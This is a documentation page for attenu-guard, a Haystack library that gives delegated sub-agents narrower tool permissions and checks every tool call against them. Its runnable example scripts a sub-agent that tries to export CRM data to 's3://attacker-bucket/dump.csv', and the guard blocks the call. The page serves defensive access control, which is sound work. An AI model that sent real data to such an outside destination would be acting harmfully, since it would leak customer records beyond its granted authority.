---
layout: integration
name: attenu-guard
description: Give each sub-agent only the permissions its task needs, and check every tool call against them
authors:
    - name: Rafael Asor
      socials:
        github: rafaelasor
pypi: https://pypi.org/project/attenu-guard/
repo: https://github.com/attenu-io/attenu-guard
type: Tool Integration
report_issue: https://github.com/attenu-io/attenu-guard/issues
version: Haystack 2.0
toc: true
---
### **Table of Contents**
- [Overview](#overview)
- [Installation](#installation)
- [Usage](#usage)
- [License](#license)

## Overview

A Haystack `AgentTool` wraps a whole `Agent`, and that sub-agent keeps its own tool list —
nothing in the framework relates it to the agent that delegated the work, so a sub-agent can
hold permissions its caller never had. attenu-guard adds that relation. You issue an
`Authority` (a set of scopes, plus ceilings such as a row limit or an egress rank, plus a
TTL) to the top-level agent, and declare what each tool consumes; a delegated sub-agent
receives the *meet* of what it asks for and what its parent holds, so authority can only
shrink down a chain, never widen. Every tool call is then checked against the authority of
the agent actually making it, before the tool body runs.

attenu-guard is an in-process enforcement shim, not a sandbox — it runs as a function call
next to the tool it protects, so nothing needs a network. It also does not decide what
authority a task needs; you write the `Authority` and the policy for each tool. The adapter
uses Haystack's public extension points only (it subclasses `Tool` for the `invoke` /
`invoke_async` gate, and implements the `ConfirmationStrategy` protocol for the `before_tool`
hook), so no framework internals are patched. A denial is raised as a `ToolInvocationError`,
so the Agent's existing `raise_on_tool_invocation_failure` setting decides whether the model
is told and the run continues, or the run stops — the tool body never runs either way.

Every allow and deny is appended to a hash-chained audit log by default, which anyone can
verify offline without attenu-guard's help. Signing the log's anchors with Ed25519 is
optional and needs the `cryptography` extra (`pip install 'attenu-guard[crypto]'`).

Docs: [attenu.io/docs](https://attenu.io/docs/).

## Installation

```bash
pip install 'attenu-guard[haystack]'
```

## Usage
### Components

This integration introduces no new Haystack components. It adds one module,
`attenu_guard.adapters.haystack`, which wraps the tools you already have:

- `guard_tools(tools, policies)`: returns copies of your tools that authorize before the
  tool body runs. The copy is a subclass of each tool's own class, so `ComponentTool`,
  `AgentTool`, `PipelineTool` and their `inputs_from_state` / `outputs_to_string` behaviour
  are unchanged.
- `ToolPolicy` / `Grant`: what a tool consumes, and — for an `AgentTool` — the authority the
  sub-agent is delegated.
- `authority(guard)`: the context manager that puts a `Guard` in force for a run.
- `attenuation_hook(policies)`: the same decision as a `before_tool` `ConfirmationHook`, if
  you would rather Haystack reject the call in its own rejection shape.

### Delegate to a sub-agent with less authority than the caller

The snippet below is offline and needs no API key — the "model" is a scripted Haystack
component that replays a fixed sequence of tool calls, so it runs standalone in about a
second. A coordinator delegates research to a sub-agent through Haystack's own `AgentTool`,
handing it a narrower authority: read the CRM, at most 5,000 rows, no egress. The sub-agent's
scripted model then tries to export the CRM anyway — attenu-guard denies that call before
`crm_export`'s body runs, because the sub-agent was never given the authority for it.

```python
from typing import Any

from haystack import component
from haystack.components.agents import Agent
from haystack.dataclasses import ChatMessage, ToolCall
from haystack.tools import AgentTool, Tool

from attenu_guard import Authority, EgressRank, Guard, RowLimit
from attenu_guard.adapters.haystack import Grant, ToolPolicy, authority, guard_tools

COORDINATOR_AUTHORITY = Authority(scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600)
RESEARCHER_AUTHORITY = Authority(scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900)

exported_to = None


def crm_query(rows: int) -> str:
    return f"{rows} CRM rows"


def crm_export(destination: str) -> str:
    global exported_to
    exported_to = destination  # must NEVER happen
    return f"exported to {destination}"


crm_tools = [
    Tool(name="crm_query", description="Read rows from the CRM.",
         parameters={"type": "object", "properties": {"rows": {"type": "integer"}}, "required": ["rows"]},
         function=crm_query),
    Tool(name="crm_export", description="Export the CRM to an external destination.",
         parameters={"type": "object", "properties": {"destination": {"type": "string"}}, "required": ["destination"]},
         function=crm_export),
]

RESEARCHER_POLICIES = {
    "crm_query": ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]}),
    "crm_export": ToolPolicy("crm.export", context=lambda a: {"egress": "any"}),
}


@component
class ScriptedChatGenerator:
    """Replays a fixed script of replies, one per assistant turn. No API key needed."""

    def __init__(self, script: list) -> None:
        self.script = script

    @component.output_types(replies=list[ChatMessage])
    def run(self, messages: list[ChatMessage], tools: Any = None,
            streaming_callback: Any = None, generation_kwargs: dict | None = None) -> dict:
        turn = sum(1 for m in messages if m.role.value == "assistant")
        entry = self.script[turn] if turn < len(self.script) else "Done."
        if isinstance(entry, str):
            return {"replies": [ChatMessage.from_assistant(entry)]}
        calls = [ToolCall(tool_name=name, arguments=args, id=f"call_{turn}_{i}")
                 for i, (name, args) in enumerate(entry)]
        return {"replies": [ChatMessage.from_assistant(tool_calls=calls)]}


researcher_script = [
    [("crm_query", {"rows": 4200})],
    [("crm_export", {"destination": "s3://attacker-bucket/dump.csv"})],
    "Q3 pipeline researched.",
]
researcher = Agent(
    chat_generator=ScriptedChatGenerator(researcher_script),
    tools=guard_tools(crm_tools, RESEARCHER_POLICIES),
    system_prompt="Research the CRM pipeline.",
)

coordinator_script = [[("ask_researcher", {"messages": [{"role": "user", "content": "Research Q3"}]})], "Reported."]
coordinator = Agent(
    chat_generator=ScriptedChatGenerator(coordinator_script),
    tools=guard_tools(
        [AgentTool(agent=researcher, name="ask_researcher", description="Delegate CRM research.")],
        {"ask_researcher": ToolPolicy(None, delegates_to="researcher",
                                       grant=Grant(RESEARCHER_AUTHORITY, task="research Q3 pipeline"))},
    ),
    system_prompt="Delegate research, then report.",
)

root = Guard.issue("coordinator", COORDINATOR_AUTHORITY, task="quarterly report")
with authority(root):
    coordinator.run(messages=[ChatMessage.from_user("Summarise Q3")])

print("exported_to:", exported_to)  # None: the export never ran
for e in root.audit_log().entries:
    if e["event"] == "deny":
        print("denied:", e["tool"], e["reason"])
```

Running this prints `exported_to: None` and a `denied: crm_export ...` line from the ledger:
the sub-agent's model asked for the export, but the tool body never ran, because the
sub-agent was never granted `crm.export` in the first place — not because a prompt told it
not to.

### License

attenu-guard is licensed under the Apache License 2.0.
